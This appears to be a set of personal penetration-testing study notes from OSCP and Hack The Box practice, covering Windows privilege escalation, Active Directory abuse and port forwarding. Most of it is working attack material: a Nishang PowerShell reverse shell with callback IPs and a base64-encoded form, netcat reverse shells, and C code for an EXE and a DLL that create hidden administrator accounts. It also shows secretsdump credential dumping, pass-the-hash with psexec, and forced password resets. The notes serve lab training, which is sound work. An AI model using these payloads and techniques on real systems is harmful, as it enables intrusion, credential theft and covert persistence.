	- URL encoded: (dir+2>%261+*`|echo+CMD)%3b%26<%23+rem+%23>echo+PowerShell

<details>
	<summary>Output Breakdown and Example </summary> 

```sh
PS C:\xampp\htdocs\passwordmanager> get-applockerpolicy -effective | select -expandproperty rulecollections
get-applockerpolicy -effective | select -expandproperty rulecollections


PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : b7af7102-efde-4369-8a89-7a6a392d1473
Name                : (Default Rule) All digitally signed Windows Installer files
Description         : Allows members of the Everyone group to run digitally signed Windows Installer files.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\Installer\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 5b290184-345a-4453-b184-45305f6d9a54
Name                : (Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer
Description         : Allows members of the Everyone group to run all Windows Installer files located in 
                      %systemdrive%\Windows\Installer.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*.*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 64ad46ff-0d71-4fa0-a30b-3f3d30c5433d
Name                : (Default Rule) All Windows Installer files
Description         : Allows members of the local Administrators group to run all Windows Installer files.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PathConditions      : {%OSDRIVE%\*}
PathExceptions      : {%OSDRIVE%\Administration\*}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 7eadbece-51d4-4c8b-9ab5-39faed1bd93e
Name                : %OSDRIVE%\*
Description         : 
UserOrGroupSid      : S-1-1-0
Action              : Deny

PathConditions      : {%OSDRIVE%\Administration\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : e6d62a73-11da-4492-8a56-f620ba7e45d9
Name                : %OSDRIVE%\Administration\*
Description         : 
UserOrGroupSid      : S-1-5-21-2955427858-187959437-2037071653-1002
Action              : Allow
``` 

`PublisherConditions`: Conditions based on the identity of the software's publisher. The syntax {*\*\*,0.0.0.0-*} represents a range of software from any publisher and any version. This is typically used in publisher rules to allow or deny applications based on their signed publisher certificate.

`PathConditions`: Specifies the file paths to which the rule applies. For example, {%WINDIR%\Installer\*} applies to all files in the Windows Installer directory within the Windows directory.

`HashExceptions`, PathExceptions, PublisherExceptions: These are exceptions to the rule based on file hashes, file paths, and software publishers, respectively. If a file matches an exception, the rule does not apply to it.

`Id`: A unique identifier for the rule.

`Name`: A descriptive name for the rule, such as “(Default Rule) All Windows Installer files”.

`Description`: Provides more details about what the rule does, such as “Allows members of the Everyone group to run digitally signed Windows Installer files.”

`UserOrGroupSid`: The security identifier (SID) for the user or group to whom the rule applies. For example, S-1-1-0 is the SID for the "Everyone" group, and S-1-5-32-544 represents the "Administrators" group.

`Action`: Specifies what action the policy takes when a rule is matched. “Allow” means the application is permitted to run, while “Deny” means it is blocked.

Here’s a brief explanation of each rule based on the output:

The first rule allows all users (“Everyone” group) to run any digitally signed Windows Installer files.
The second rule allows all users to run any Windows Installer files located in %systemdrive%\Windows\Installer.
The third rule allows members of the local Administrators group to run all Windows Installer files.
The fourth rule denies all users from running any files from any directory on the OS drive, except for a specified path.
The fifth rule specifically allows a user (indicated by the SID S-1-5-21-...) to run files in the %OSDRIVE%\Administration\ directory.



</details>
                                       

#### 64Bit or not with low auth via powershell??

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> [System.Environment]::Is64BitOperatingSystem
True
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> [System.Environment]::Is64BitProcess
True
```




### Windows based tools

GTFObins but for Windows - https://lolbas-project.github.io/#

Run dnSpy to look atthe .exe file
- wget https://github.com/dnSpy/dnSpy/releases/download/v6.1.8/dnSpy-net-win64.zip
Install wine 
- `sudo apt install wine64 -y`



#### [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

While there are often missing findings by **winPEAS**, the sheer amount of information resulting from its execution demonstrates how much time we can save in order to avoid manually obtaining all this information.

Automated tools can be blocked by AV solutions. If so:
- we can apply techniques learned in the Module "Antivirus Evasion"
- try other tools such as [Seatbelt](https://github.com/GhostPack/Seatbelt) and [JAWS](https://github.com/411Hall/JAWS) 
- or do the enumeration manually.

Binaries [here](https://github.com/carlospolop/PEASS-ng/releases/tag/20240128-3084e4e1)

To upload to a host you can use `upload` in Evil-winRM

Then to get the ansi colors out out to get a html file, use.
```sh
-----STARTING with BASH use the script module to record the output
script output.txt

-----EVIL on to Windows OR whatever your action is...
*Evil-WinRM* PS C:\Users\FSmith\Documents> .\winPEASx64_ofs.exe

-----EXIT back to BASH

ansi2html < output.txt > term.html

```

```
sudo apt install peass
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
PS: iwr -uri http://192.168.45.188/winPEASx64.exe -Outfile winPEAS.exe
PS: .\winPEAS.exe -c        # Winpeas needs -c to run in the colour for some reason
```
current on machine at /home/kali/OSCP/OSCP-COURSE-Notes/OSCP-Obsidian-Vault/TMP-NOtes/WinPrivEsc/winPEASx64.exe

#### Seatbelt
- https://github.com/GhostPack/Seatbelt

```
iwr -uri http://192.168.45.188/Seatbelt.exe -Outfile Seatbelt.exe
./Seatbelt.exe -group=all
./Seatbelt.exe -group=all -full -outputfile="C:\Temp\out.txt"'
```


### Win Enum Tools 

- Winpeas

### Windows Shell
`dir "root.txt" /s` : find a file named `root.txt`
`type root.txt` : Same as `echo root.txt` in `BASH`

Apparently `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"` is a command for Windows. When executed in the Command Prompt, it provides information about the operating system, including the OS name and version. 

### Windows shell/powershell commands

About [Powershell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1)

```
Get-Service where {$_.Status -eq "Running"}     # See what service are running
net groups /domain                            # This will llist all the groups 
type WindowsUpdate.log | findstr KB  # This will show us when the updates were actually installing patches
```


-  
#### What is powersploit and Powerview? 
Powerview is a Powershell module which gives you access to a bunch of active directory queries.

#### Leverage windows Services for PrivEsc
**Listing the running Services**
`Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`

We can choose between the traditional _icacls_ Windows utility or the PowerShell Cmdlet [Get-ACL](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.2) For this example, we'll use icacls since it usable both in PowerShell and the Windows command line.

The `icacls` utility outputs the corresponding principals and their [permission mask](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) The most relevant permissions and their masks are listed below:

| Mask |       Permissions       |             |
| :--: | :---------------------: | ----------- |
|  F   |       Full access       | Can replace |
|  M   |      Modify access      | Can replace |
|  RX  | Read and execute access |             |
|  R   |    Read-only access     |             |
|  W   |    Write-only access    |             |

`icacls "C:\path\to\Bin\file.exe"`

##### Powerup.ps1 ( Ppwershell script to look for Priv esc though Binaries etc)

(Requires Admin). We should never blindly trust or rely on the output of automated tools. However, [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) is a great tool to identify potential privilege escalation vectors, which can be used to automatically check if the vulnerability can be exploited. If this is not the case, we should do some manual analysis if the potential vector is not vulnerable or the AbuseFunction just cannot exploit it.
Also see: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc


```
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80

PS C:\Users\dave> iwr -uri http://192.168.45.188/PowerUp.ps1 -Outfile PowerUp.ps1
PS C:\Users\dave> powershell -ep bypass  # ExecutionPolicy Bypass. Else, running scripts are blocked.
...
PS C:\Users\dave>  . .\PowerUp.ps1
PS C:\Users\dave> Get-ModifiableService File 

S C:\Users\dave>  Get-ModifiablePath # could also be used for current user

S C:\Users\dave> Restart-Service -Name 'SERVICE_NAME'

```

#### from the HTB REEL box
```
PS Q:\> Set-DomainObjectOwner -Identity Herman -OwnerIdentiy nico  
PS Q:\> Add-DomainObjectAcl -TargetIdentity Herman -PrincipleIdentity nico -Rights ResetPasswoird -Verbose

# Change Hermans Passowrd
PS Q:\>$pass = ConvertTo-SecureStrings 'PleaseSubscribe!' -AsPlainText -Force
PS Q:\> Set-DomainUserPassword Herman -AccountPassword $pass -Verbose

# See what groups we are members of
PS Q:\> Get-DomainGroup -MemberIdentiy Herman | select samaccountname

# Create a new credential 
PS Q:\> $cred = New-Object System.Manage,ment.Automation.PSCredential('HTB\Herman',$pass)

# Add ourselves to a admin group
PS Q:\> Add-DomainGroupMember -Identity 'Backup_Admins' -Members herman -Credential $cred
```

### nishang
https://github.com/samratashok/nishang
Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security and post exploitation during Penetration Tests. 


From htb Scrambled

sudo apt-get install nishang   
```
└─$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 rev.ps1  
```


Edit `rev.ps1`
    - Take the first two and last two coments out, and also uncoment the client line

So from this
```sh
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
#$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

#$sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```

...to this.

```sh
$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Then set `rev.ps1` callback ip 

```sh
$client = New-Object System.Net.Sockets.TCPClient('<CALLBACK_IP_ADDRESS>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```sh
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.42',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Note: AMSI will block it if Defender is installed onthe box, otherwise this should work.

Lastly we should format `rev.ps1` into a powershell base 64 for ease of transport and use.

```sh
cat rev.ps1 | iconv -t UTF-16LE    
# this will change the format to powershell bas64 format and how its printed. 
# This means we can pass in the b64 straight to powershell 

# it will lok the same in the terminal but if we look closer...

# We can see now everything is two bytes....

cat rev.ps1 | iconv -t UTF-16LE | xxd
00000000: 2400 6300 6c00 6900 6500 6e00 7400 2000  $.c.l.i.e.n.t. .
00000010: 3d00 2000 4e00 6500 7700 2d00 4f00 6200  =. .N.e.w.-.O.b.
00000020: 6a00 6500 6300 7400 2000 5300 7900 7300  j.e.c.t. .S.y.s.
00000030: 7400 6500 6d00 2e00 4e00 6500 7400 2e00  t.e.m...N.e.t...
00000040: 5300 6f00 6300 6b00 6500 7400 7300 2e00  S.o.c.k.e.t.s...
00000050: 5400 4300 5000 4300 6c00 6900 6500 6e00  T.C.P.C.l.i.e.n.
00000060: 7400 2800 2700 3100 3900 3200 2e00 3100  t.(.'.1.9.2...1.
00000070: 3600 3800 2e00 3200 3500 3400 2e00 3100  6.8...2.5.4...1.
00000080: 2700 2c00 3400 3400 3400 3400 2900 3b00  '.,.4.4.4.4.).;.

# ...whereas without 
cat rev.ps1 | xxd                    
00000000: 2463 6c69 656e 7420 3d20 4e65 772d 4f62  $client = New-Ob
00000010: 6a65 6374 2053 7973 7465 6d2e 4e65 742e  ject System.Net.
00000020: 536f 636b 6574 732e 5443 5043 6c69 656e  Sockets.TCPClien
00000030: 7428 2731 3932 2e31 3638 2e32 3534 2e31  t('192.168.254.1
00000040: 272c 3434 3434 293b 2473 7472 6561 6d20  ',4444);$stream 
00000050: 3d20 2463 6c69 656e 742e 4765 7453 7472  = $client.GetStr
00000060: 6561 6d28 293b 5b62 7974 655b 5d5d 2462  eam();[byte[]]$b
00000070: 7974 6573 203d 2030 2e2e 3635 3533 357c  ytes = 0..65535|
00000080: 257b 307d 3b77 6869 6c65 2828 2469 203d  %{0};while(($i =
...
```

Lastly we can get rid of line wrapping and the take the out put and give it directly to Powesershell.
This will give us out `ENCODED-BASE64-NISHANG-BLOB`
```sh
cat rev.ps1 | iconv -t UTF-16LE | base64 -w 0
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADIANQA0AC4AMQAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA  

# as per This impacket-mssqlClient tool
└─$ impacket-mssqlclient -k dc1.scrm.local
...
...
SQL (SCRM\administrator  dbo@master)> xpcmdshell powershell -enc <ENCODED-BASE64-NISHANG-BLOB>
```
**Note** that on windows its also best to place these kind of payloads `powershell -enc <ENCODED-BASE64-NISHANG-BLOB>` into `.bat` files becasue **.bat file are executed automaticaly by windows, where as Powershell files are not.**

---


## Port forwarding on Windows

#### Use Plink to create a remote port forward to access the RDP service on Windows machien with ha webshell.
1. Appache 2 to serve up nc (native to kali).
`A1~:$ sudo systemctl start apache2`
webshell.
1. Find local `nc` to share
`A1~:$ find / -name nc.exe 2>/dev/null`
webshell.
1. Copy `nc` to our kali webserver (WS) dir
`A1~:$ sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/`
webshell.
1. Find local `Plink` to share
`A1~:$ find / -name plink.exe 2>/dev/null`
webshell.
1. Copy `Plink` to our local kali webserver dir 
`A1~:$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/`
webshell.
1. Download nc from our victims webshell
`WS:> powershell wget -Uri http://192.168.45.189/nc.exe -OutFile C:\Windows\Temp\nc.exe`
webshell.
1. Set up a local listener 
`nc -nvlp 4446`
webshell.
1. On the WS , pop rev shell
`WS:> C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.189 4446`
webshell.
1. From the RevShell DL Plink (RS)
`RS:>powershell wget -Uri http://192.168.45.189/plink.exe -OutFile C:\Windows\Temp\plink.exe`
webshell.
1. Set up remote port forward to access Victim from rdp on kali
`WS> C:\Windows\Temp\plink.exe -ssh -l domain2 -pw **** -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.189`
`WS> C:\Windows\Temp\plink.exe -ssh -l domain2 -pw **** -R LOCAL-SOCKET:VICTIM-RDPSOCKET <ATTACK-IP>`
Similar to the OpenSSH client remote port forward command. **-R** pass the socket we want to open on the Kali SSH server, and the RDP server port on the loopback interface of victim that we want to forward packets to.
- username (**-l**) 
- password (**-pw**) directly on the command line.
**The entire command would be: 
`WS> cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw **** -R LOCAL-SOCKET:VICTIM-RDPSOCKET <ATTACK-IP>` .
webshell.
1. Confirm  locally that the port has opened:
- `A1~:$ ss -tulpn`

1. Launch rdp
```
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833 /size:1920x1080 /smart-sizing
```

#### Port forwarding with Netsh 

MutliServer 192.168.235.64
PGdataBase 10.4.235.215

1. RDP directly into 
`xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.235.64`

1. Instruct **netsh interface** to **add** a **portproxy** rule from an IPv4 listener that is forwarded to an IPv4 port (**v4tov4**). This will listen on port 2222 on the external-facing interface (**listenport=2222 listenaddress=192.168.235.64**) and forward packets to port 22 on PGDATABASE01 (**connectport=22 connectaddress=10.4.235.215**).
`RDS:> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.235.64 connectport=22 connectaddress=10.4.235.215`
1. Confim port is now listening on the Windows machine 
`RDS:> netstat -anp TCP | find "2222"`
1. Confirm port forward is stored
`RDS:> netsh interface portproxy show all`
1. Problem with port being filtered . If we run below , we shall see its filtered from the firewall
```
A1~:$ sudo nmap -sS 192.168.235.64 -Pn -n -p2222
...
PORT     STATE    SERVICE
2222/tcp filtered EtherNetIP-1
...
```

1. We will need to poke a hole in the firewall on MULTISERVER03.
**We'll also need to remember to plug that hole as soon as we're finished with it!**
Use the **netsh advfirewall firewall** subcontext to create the hole. We will use the **add rule** command and name the rule "port_forward_ssh_2222". We need to use a memorable or descriptive name, because we'll use this name to delete the rule later on.
We'll **allow** connections on the local port (**localport=2222**) on the interface with the local IP address (**localip=192.168.235.64**) using the TCP protocol, specifically for incoming traffic (**dir=in**).
```
RDS:> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.235.64 localport=2222 action=allow

Ok.
```
1. Check again how the port appears from the attack machine again.

```
A1~:$ sudo nmap -sS 192.168.235.64 -Pn -n -p2222
...
PORT     STATE    SERVICE
2222/tcp open EtherNetIP-1
...
```
1. We can now SSH to port 2222 on MULTISERVER03, as though connecting to port 22 on PGDATABASE01.

```
A1~:$ ssh database_admin@192.168.235.64 -p2222
```

1. Once we're done with the connection, we need to remember to delete the firewall rule we just created.
```
RDS:> netsh advfirewall firewall delete rule name="port_forward_ssh_2222"

Deleted 1 rule(s).
Ok.
```

1. Also delete the port forward we created.
```
RDS:> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.235.64

C:\Windows\Administrator>
```

Note: Most Windows Firewall commands have PowerShell equivalents with commandlets like `New-NetFirewallRule` and `Disable-NetFirewallRule.` **However**, the `netsh interface portproxy` command doesn't. For simplicity, we've stuck with pure `Netsh` commands in this section. 
**However, for a lot of Windows Firewall enumeration and configuration, PowerShell is extremely useful. You may wish to experiment with it while completing the exercises for this section.**

---


## Impacket

#### secretsDump
If we have obtained a user name and password of someone with DCSync privleges we can obtain the hashes of other users and then uses these to login in with `secretsdump`
- `impacket-secretsdump <DOMAIN>/<USERNAME@<IP_ADDRESS>`
- `impacket-secretsdump EGOTISTICAL-BANK/svc_loanmgr@10.129.95.180`
We can specifiy a single user with `-just-dc-user Administrator` as in 
- `impacket-secretsdump <DOMAIN>/<USERNAME@<IP_ADDRESS> -just-dc-user Administrator`

<details>
	<summary>Example output</summary>

```
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
[*] Cleaning up... 
```
</details>

#### impacket-psexec

If we have a obtained the hashes ( as above) we can then `pass-the-hash` with `impacket-psexec` to get a system shell on the box with a command structred as follows:
- `impacket-psexec <DOMAIN>/<USERNAME-OF-HASH>@<IP_ADDRESS> -hashes <LMHASH>:<NTHASH>`
- `impacket-psexec egotistical-bank.local/administrator@10.129.95.180 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e`

<details>
	<summary>Example output</summary>

```
└─$ impacket-psexec egotistical-bank.local/administrator@10.129.95.180 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.129.95.180.....
[*] Found writable share ADMIN$
[*] Uploading file fmhmoHDE.exe
[*] Opening SVCManager on 10.129.95.180.....
[*] Creating service vVaA on 10.129.95.180.....
[*] Starting service vVaA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
</details>

#### Add computer 
- `impacket-addcomputer 'authority.htb/svc_ldap' -method LDAPS -computer-name 'HACKER' -computer-pass 'Tuesday@2' -dc-ip 10.129.218.144`


#### Get Silver Ticket
```sh
┌──(kali㉿kali)-[~/…/Machines/AUTHORITY/Certipy/certipy]
└─$ impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator 'authority.htb/HACKER$:Tuesday@2'
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

### Watson ( Windows Privesc tool)
https://github.com/rasta-mouse/Watson 

`.net` version needs to be compatible between this version and the target. All availible will be in...:

```
PS C:\Windows\Microsoft.net\Framwork64\v*******\
PS C:\Windows\Microsoft.net\Framwork64\v*******> $file = Get-Item .\clr.dll
PS C:\Windows\Microsoft.net\Framwork64\v*******> [System.Diagnostics.FileVersionInfo]::GetVersionInfo($file).FileVersion

4.7..3190.0 built by Blah             # Google 4.7.3190.0 This for the version number
```
ITs a bit tricky and might need some research
and the bitsize needs to be the same.
You could compile it as a `dll`. Once on he machine run with
```
PS C:\users\Blah> [reflection.Assembly]::LoadFile("C:\users\path\to\Watson.dll")`
PS C:\users\Blah [Watson.Program]::Main()
```

##### [Unquoted Service Paths](https://www.tenable.com/sc-report-templates/microsoft-windows-unquoted-service-path-vulnerability)

1. Enumerate running and stopped services.
`Get-CimInstance -ClassName win32_service | Select Name,State,PathName`
In the windows cmd shell ( not powershell) we can run 
`wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`
Alternatively, we could use [Select-String](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-string?view=powershell-7.2) in PowerShell.

This will list out all the file paths which have spaces in them for example:
- `C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe`
	- We could create an `Enterprise.exe` and place it in `C:\Program Files`
	- or we could create a `Current.exe` and place that in ``C:\Program Files\Enterprise Apps`
2. Check path permissions with `icacls <PATH_TO_EXECUTABLE>`

3. (Optional) **If it is safe to do so** check if we can start and stop the identified service as _steve_ with **Start-Service** and **Stop-Service**.

```
PS C:\Users\steve> Start-Service <SERVICENAME>
PS C:\Users\steve> Stop-Service <SERVICENAME>
```
If we can restart here we don't need to issue a reboot.

4. Create a payload - eg: new admin user in C code and cross compile it as the name of the `.exe` file we need

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
```
LX: x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
Or make an msfvenom payload, or inject code to an existing binary

5. Transfer over to the host

```
PS: iwr -uri http://192.168.45.188/adduser.exe -Outfile Current.exe
PS: copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```
##### DLL check if dll safe mode is on 

```
$regKey = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
if ($regKey.PSObject.Properties.Name -contains 'SafeDllSearchMode') {
    $regKey.SafeDllSearchMode
} else {
    Write-Host "SafeDllSearchMode is not explicitly set. The system is using the default, which is enabled."
}
```
#### DLL Hijacking / Injection
To exploit this situation, we can try placing a malicious DLL (with the name of the missing DLL) in a path of the DLL search order so it executes when the binary is started. 

The Current standard DLL Search order on Windows Versions:
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
Note: When safe DLL search mode is disabled, the current directory is searched at position 2 after the application's directory.
Also , even with a missing DLL, the program may still work with restricted functionality.

STEPS
1. Test if you can write to the location the dll will go
```
PS C:\Users\steve> echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
PS C:\Users\steve> type 'C:\FileZilla\FileZilla FTP Client\test.txt'
test
```
2. Use [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) or similar to display real-time information about a target dll. [ProcMon Basics](https://concurrency.com/blog/procmon-basics/) . If this is not availible , we will have to copy the service over to our local machine.

3. Identify all DLLs loaded by "_BetaService_" as well as detect missing ones. 

4. Once we have a list of DLLs used by the service binary, we can check their permissions and if they can be replaced with a malicious DLL. Alternatively, if find that a DLL is missing, provide our own DLL by adhering to the DLL search order.

5.  Reusing the C code from the previous section by adding the _include_ statement as well as the system function calls to the C++ DLL code. Additionally, we need to use an _include_ statement for the header file **windows.h**, since we use Windows specific data types such as _BOOL_. The final code is shown in the following listing.

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Cross compile the above with: `x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll`

----

###### Sneaky file ready with robocopy

`robocopy "C:\Users\enterpriseadmin\Desktop" . flag.txt /B /R:1 /W:1`

`robocopy "C:\Target\path\Directory" . FILE.txt /B /R:1 /W:1`
- **`/B`**: This stands for **Backup mode**. It tells `robocopy` to use the **SeBackupPrivilege**, which allows copying files even if the current user does not have explicit permissions to access them.
    
- **`/R:1`**: This option sets the **retry count** to `1`, meaning `robocopy` will retry copying the file **once** if there's an issue (e.g., if the file is in use).
    
- **`/W:1`**: This option sets the **wait time** between retries to `1 second`. If an issue occurs and `robocopy` has to retry copying, it will wait 1 second between attempts.


#### xfreerdp (Connect to a a windows machine from Linux)
xfreerdp also supports [NLA](https://en.wikipedia.org/wiki/Remote_Desktop_Services#Network_Level_Authentication) for non domain-joined machines.

Open a regular connection:
`xfreerdp /u:student /p:lab /v:192.168.50.152`
Open a regular with full screen:
`xfreerdp /u:student /p:lab /v:192.168.50.152 /f`
